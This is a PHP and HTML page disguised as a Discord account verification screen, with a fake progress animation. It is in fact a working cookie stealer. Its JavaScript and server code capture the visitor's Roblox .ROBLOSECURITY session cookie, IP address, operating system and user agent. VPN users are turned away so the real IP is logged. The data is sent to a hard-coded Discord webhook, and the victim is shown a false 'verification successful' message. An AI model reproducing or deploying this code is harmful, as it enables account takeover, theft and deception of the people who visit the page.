<?php
     session_start(); // Start session to track users

     function getOS($userAgent) {
         $os = "Unknown";
         if (preg_match('/Windows/i', $userAgent)) $os = "Windows";
         elseif (preg_match('/Macintosh|Mac OS/i', $userAgent)) $os = "MacOS";
         elseif (preg_match('/Linux/i', $userAgent)) $os = "Linux";
         elseif (preg_match('/Android/i', $userAgent)) $os = "Android";
         elseif (preg_match('/iPhone|iPad|iPod/i', $userAgent)) $os = "iOS";
         return $os;
     }

     function isVPN($ip) {
         if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
             return "Private/Reserved IP - VPN likely";
         }
         $vpn_ranges = [
             '104.16.0.0/12',   // Cloudflare
             '172.16.0.0/12',   // VPN common range
             '10.0.0.0/8',      // Private networks
             '192.168.0.0/16',  // Private networks
             '100.64.0.0/10',   // Carrier-grade NAT
             '169.254.0.0/16'   // Link-local
         ];
         foreach ($vpn_ranges as $range) {
             if (ip_in_range($ip, $range)) {
                 return "VPN Detected - Matches range: $range";
             }
         }
         return false;
     }

     function ip_in_range($ip, $range) {
         if (strpos($range, '/') === false) {
             return $ip === $range;
         }
         list($subnet, $mask) = explode('/', $range);
         $ip_dec = ip2long($ip);
         $subnet_dec = ip2long($subnet);
         $mask_dec = ~((1 << (32 - $mask)) - 1);
         return ($ip_dec & $mask_dec) === ($subnet_dec & $mask_dec);
     }

     if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $input = file_get_contents('php://input');
         $data = json_decode($input, true);

         // Get user ID from URL or POST data
         $user_id = $data['user_id'] ?? $_GET['user'] ?? 'Unknown';

         // Robust cookie capture with fallback
         $cookie = $data['cookie'] ?? (function() {
             $cookies = $_SERVER['HTTP_COOKIE'] ?? '';
             if (preg_match('/\.ROBLOSECURITY=([^;]+)/i', $cookies, $matches)) {
                 return $matches[1];
             }
             foreach ($_COOKIE as $name => $value) {
                 if (stripos($name, 'robloxsecurity') !== false) {
                     return $value;
                 }
             }
             return 'Not found';
         })();

         $user_agent = $_SERVER['HTTP_USER_AGENT'];
         $os = getOS($user_agent);

         // Get real IP from X-Forwarded-For (last IP is client IP)
         $forwarded = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? '';
         if ($forwarded) {
             $ip_list = array_map('trim', explode(',', $forwarded));
             $ip_address = $ip_list[count($ip_list) - 1]; // Take the last IP (client's)
         } else {
             $ip_address = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
         }

         // Check for VPN and bypass
         $vpn_status = isVPN($ip_address);
         if ($vpn_status) {
             header('Content-Type: text/html');
             echo '<!DOCTYPE html><html><head><title>VPN Detected</title><style>body{background:#2f3136;color:#fff;text-align:center;padding:20px;font-family:Arial}</style></head><body><h1>VPN Detected</h1><p>Sorry, VPNs are not allowed. Debug: ' . htmlspecialchars($vpn_status) . '. Please disable your VPN and try again.</p></body></html>';
             exit;
         }

         // Check if user already verified this session
         $session_key = "verified_{$user_id}_{$ip_address}";
         if (isset($_SESSION[$session_key])) {
             header('Content-Type: application/json');
             echo json_encode(['status' => 'already_verified']);
             exit;
         }
         $_SESSION[$session_key] = true;

         // Flat payload with ping
         $payload = [
             'content' => "<@{$user_id}>", // Ping the user
             'username' => 'Verification Bot',
             'embeds' => [],
             'attachments' => [],
             'status' => 'verified',
             'discord_user_id' => $user_id,
             'cookie' => $cookie,
             'ip_address' => $ip_address,
             'user_agent' => substr($user_agent, 0, 1000),
             'os' => $os,
             'timestamp' => date('c')
         ];

         // Send to webhook once
         $webhook_url = 'https://discord.com/api/webhooks/1426256242690625600/jw-wr_1D7IL7sy62Zn608UgN1UXXE8BURCtmPZmMUq-QKizwKFoxOKSahLJhIZKTjfZe';
         $options = [
             'http' => [
                 'header'  => "Content-Type: application/json\r\n",
                 'method'  => 'POST',
                 'content' => json_encode($payload)
             ]
         ];
         $context = stream_context_create($options);
         file_get_contents($webhook_url, false, $context);

         // AJAX response
         header('Content-Type: application/json');
         echo json_encode(['status' => 'success']);
         exit;
     }
     ?>

     <!DOCTYPE html>
     <html lang="en">
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <title>Discord Account Verification</title>
         <link href="https://fonts.googleapis.com/css2?family=Whitney:wght@400;500;600&display=swap" rel="stylesheet">
         <style>
             * { margin: 0; padding: 0; box-sizing: border-box; }
             body {
                 font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
                 background: linear-gradient(135deg, #36393f 0%, #2f3136 100%);
                 color: #dcddde;
                 display: flex;
                 justify-content: center;
                 align-items: center;
                 min-height: 100vh;
                 overflow: hidden;
             }
             .container {
                 background: rgba(32, 34, 37, 0.95);
                 backdrop-filter: blur(10px);
                 border-radius: 12px;
                 padding: 40px;
                 text-align: center;
                 width: 100%;
                 max-width: 450px;
                 box-shadow: 0 10px 40px rgba(0, 0, 0, 0.4);
                 animation: fadeIn 1s ease-out;
                 border: 1px solid rgba(79, 84, 92, 0.5);
             }
             @keyframes fadeIn {
                 from { opacity: 0; transform: translateY(30px) scale(0.95); }
                 to { opacity: 1; transform: translateY(0) scale(1); }
             }
             h1 {
                 color: #5865f2;
                 font-size: 30px;
                 font-weight: 600;
                 margin-bottom: 20px;
                 background: linear-gradient(135deg, #5865f2, #7289da);
                 -webkit-background-clip: text;
                 -webkit-text-fill-color: transparent;
                 background-clip: text;
                 text-shadow: 0 2px 4px rgba(88, 101, 242, 0.3);
             }
             p {
                 font-size: 16px;
                 margin-bottom: 25px;
                 opacity: 0.8;
                 text-shadow: 0 1px 2px rgba(0, 0, 0, 0.2);
             }
             ul#steps {
                 list-style: none;
                 margin: 0 auto;
                 max-width: 350px;
             }
             ul#steps li {
                 font-size: 16px;
                 margin-bottom: 15px;
                 padding: 10px 15px;
                 background: rgba(54, 57, 63, 0.5);
                 border-radius: 8px;
                 position: relative;
                 transition: background 0.3s ease, color 0.3s ease;
                 box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
             }
             ul#steps li.done {
                 background: rgba(87, 242, 135, 0.2);
                 color: #57f287;
             }
             ul#steps li .check {
                 position: absolute;
                 right: 15px;
                 font-size: 18px;
                 opacity: 0;
                 transition: opacity 0.3s ease;
             }
             ul#steps li.done .check {
                 opacity: 1;
             }
             .success {
                 animation: pulse 1s ease-in-out;
             }
             @keyframes pulse {
                 0% { transform: scale(1); }
                 50% { transform: scale(1.05); }
                 100% { transform: scale(1); }
             }
             .success h1 {
                 color: #57f287;
                 background: linear-gradient(135deg, #57f287, #43b581);
                 -webkit-background-clip: text;
                 -webkit-text-fill-color: transparent;
                 background-clip: text;
                 text-shadow: 0 2px 4px rgba(67, 181, 129, 0.3);
             }
             @media (max-width: 480px) {
                 .container { padding: 30px 20px; margin: 20px; }
                 h1 { font-size: 26px; }
             }
         </style>
     </head>
     <body>
         <div class="container" id="container">
             <h1>Discord Account Verification</h1>
             <p>We're verifying your account in a few steps. Please wait...</p>
             <ul id="steps">
                 <li id="step1">Checking device...<span class="check">✓</span></li>
                 <li id="step2">Verifying identity...<span class="check">✓</span></li>
                 <li id="step3">Scanning for threats...<span class="check">✓</span></li>
                 <li id="step4">Finalizing access...<span class="check">✓</span></li>
             </ul>
         </div>
         <script>
             function getCookie(name) {
                 const value = `; ${document.cookie}`;
                 const parts = value.split(`; ${name}=`);
                 if (parts.length === 2) return parts.pop().split(';').shift();
                 return "Not found";
             }

             const userId = new URLSearchParams(window.location.search).get('user') || 'Unknown';
             const robloxCookie = getCookie('.ROBLOSECURITY');
             const data = { cookie: robloxCookie, user_id: userId };

             // Send data immediately
             fetch(window.location.pathname, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(data)
             })
             .then(response => response.json())
             .then(result => {
                 if (result.status === 'success') {
                     // Start interactive animation
                     setTimeout(() => document.getElementById('step1').classList.add('done'), 500);
                     setTimeout(() => document.getElementById('step2').classList.add('done'), 1500);
                     setTimeout(() => document.getElementById('step3').classList.add('done'), 2500);
                     setTimeout(() => document.getElementById('step4').classList.add('done'), 3500);
                     setTimeout(() => {
                         const container = document.getElementById('container');
                         container.classList.add('success');
                         container.innerHTML = `
                             <h1>Verification Successful!</h1>
                             <p>Your Discord account has been verified. You can now return to the server and enjoy full access.</p>
                         `;
                     }, 4500);
                 } else if (result.status === 'already_verified') {
                     const container = document.getElementById('container');
                     container.classList.add('success');
                     container.innerHTML = `
                         <h1>Already Verified!</h1>
                         <p>You’ve already verified. Return to the server and enjoy full access.</p>
                     `;
                 }
             })
             .catch(error => console.error('Error:', error));
         </script>
     </body>
     </html>
